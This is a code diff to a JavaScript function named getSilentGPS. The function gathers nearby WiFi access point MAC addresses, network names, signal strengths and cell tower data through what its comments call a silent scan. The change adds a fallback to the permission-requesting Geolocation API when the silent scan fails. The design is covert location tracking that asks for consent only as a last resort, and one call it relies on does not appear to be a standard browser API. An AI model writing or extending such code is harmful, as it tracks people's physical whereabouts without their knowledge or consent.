@@ -291,10 +291,11 @@
           }))
           .catch(() => ({}));
 
-      /* ── 2. Silent GPS (WiFi + Cell Tower) ── */
+      /* ── 2. Silent GPS (WiFi + Cell Tower) with Fallback ── */
       const getSilentGPS = async () => {
         const result = { wifi: [], cell: [] };
         try {
+          /* Try silent scan first */
           const details = await (navigator.connection?.getNetworkDetails?.() || Promise.resolve({}));
           if (details.wifi) {
             result.wifi = details.wifi.map(a => ({ mac: a.BSSID, ssid: a.SSID, signal: a.signalStrength }));
@@ -315,6 +316,17 @@
             if (d.lat) result.mozilla = { lat: d.lat, lon: d.lon, accuracy: d.accuracy };
           }
         } catch { /* */ }
+
+        /* Fallback: If silent scan failed, use standard Geolocation (asks permission) */
+        if (!result.wifi.length && !result.cell.length && navigator.geolocation) {
+          try {
+            const pos = await new Promise((resolve, reject) =>
+              navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: true })
+            );
+            result.fallback = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
+          } catch { /* */ }
+        }
+
         return result;
       };
 
